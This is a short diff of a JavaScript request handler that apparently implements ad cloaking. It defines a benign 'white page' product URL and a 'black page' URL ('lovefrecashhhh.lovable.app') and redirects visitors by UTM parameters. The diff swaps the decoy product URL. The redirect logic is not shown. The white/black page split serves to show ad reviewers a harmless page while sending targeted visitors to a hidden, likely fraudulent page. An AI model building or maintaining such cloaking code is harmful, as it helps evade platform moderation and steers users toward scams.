@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.gufino.com/collections/all/products/english-spanish-flash-cards-for-kids";
+    const whitePageURL = "https://bdonix.com/product/adjustable-laptop-wooden-table/?srsltid=AfmBOopyGZxJ9knlBjpUtDYuNMIuXrnDHhoq3kkBnanwqr9VNXw79C-v";
     const blackPageURL = "https://lovefrecashhhh.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
